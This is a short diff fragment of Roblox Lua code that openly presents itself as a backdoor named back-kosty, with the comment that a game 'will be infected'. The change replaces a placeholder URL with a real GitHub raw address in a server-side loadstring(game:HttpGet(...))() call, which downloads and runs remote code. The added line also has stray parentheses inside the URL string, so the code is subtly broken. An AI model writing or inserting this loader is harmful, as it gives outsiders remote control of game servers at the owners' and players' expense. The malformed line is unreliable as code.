@@ -24,5 +24,5 @@ backdoor.OnServerEvent:Connect(function(player, SS)
 end)
 
 # after that your game will be infected by back-kosty
-# loadstring 1
-loadstring(game:HttpGet("https://example.com/script.lua"))()
+# loadstring 1 (SERVERSIDE)
+loadstring(game:HttpGet("(https://raw.githubusercontent.com/Kostyosthesystem/back-kosty/refs/heads/main/scanner.lua)")()
